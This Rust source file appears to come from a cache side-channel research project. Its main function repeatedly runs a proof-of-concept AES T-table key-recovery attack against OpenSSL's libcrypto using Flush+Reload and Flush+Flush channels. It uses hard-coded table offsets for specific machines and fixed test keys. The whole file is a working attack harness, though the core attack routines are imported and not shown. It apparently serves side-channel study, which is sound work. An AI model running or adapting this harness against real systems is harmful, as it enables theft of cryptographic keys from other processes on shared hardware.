#![feature(unsafe_block_in_unsafe_fn)]
#![deny(unsafe_op_in_unsafe_fn)]
use aes_t_tables::{attack_t_tables_poc, AESTTableParams};
use flush_flush::{FlushAndFlush, SingleFlushAndFlush};
use flush_reload::naive::*;
use nix::sched::sched_setaffinity;
use nix::unistd::Pid;
use std::path::Path;

const KEY2: [u8; 32] = [
    0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc,
    0x4f, 0x6e, 0x9c, 0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80,
];

// On cyber cobaye
// 00000000001cc480 r Te0
// 00000000001cc080 r Te1
// 00000000001cbc80 r Te2
// 00000000001cb880 r Te3
const TE_CYBER_COBAYE: [isize; 4] = [0x1cc480, 0x1cc080, 0x1cbc80, 0x1cb880];

const TE_CITRON_VERT: [isize; 4] = [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140];

fn main() {
    let openssl_path = Path::new(env!("OPENSSL_DIR")).join("lib/libcrypto.so");
    let mut side_channel = NaiveFlushAndReload::from_threshold(220);
    let te = TE_CITRON_VERT;
    for i in 0..4 {
        println!("AES attack with Naive F+R, key 0");
        unsafe {
            attack_t_tables_poc(
                &mut side_channel,
                AESTTableParams {
                    num_encryptions: 1 << 12,
                    key: [0; 32],
                    te: te, // adjust me (should be in decreasing order)
                    openssl_path: &openssl_path,
                },
            )
        };
        println!("AES attack with Naive F+R, key 1");
        unsafe {
            attack_t_tables_poc(
                &mut side_channel,
                AESTTableParams {
                    num_encryptions: 1 << 12,
                    key: KEY2,
                    te: te,
                    openssl_path: &openssl_path,
                },
            )
        };
        println!("AES attack with Multiple F+F (limit = 3), key 0");
        {
            let (mut side_channel_ff, old, core) = FlushAndFlush::new_any_single_core().unwrap();
            unsafe {
                attack_t_tables_poc(
                    &mut side_channel_ff,
                    AESTTableParams {
                        num_encryptions: 1 << 12,
                        key: [0; 32],
                        te: te, // adjust me (should be in decreasing order)
                        openssl_path: &openssl_path,
                    },
                )
            };
        }

        println!("AES attack with Single F+F , key 1");
        {
            let (mut side_channel_ff, old, core) =
                SingleFlushAndFlush::new_any_single_core().unwrap();
            unsafe {
                attack_t_tables_poc(
                    &mut side_channel_ff,
                    AESTTableParams {
                        num_encryptions: 1 << 12,
                        key: KEY2,
                        te: te, // adjust me (should be in decreasing order)
                        openssl_path: &openssl_path,
                    },
                )
            }
        }
    }
}
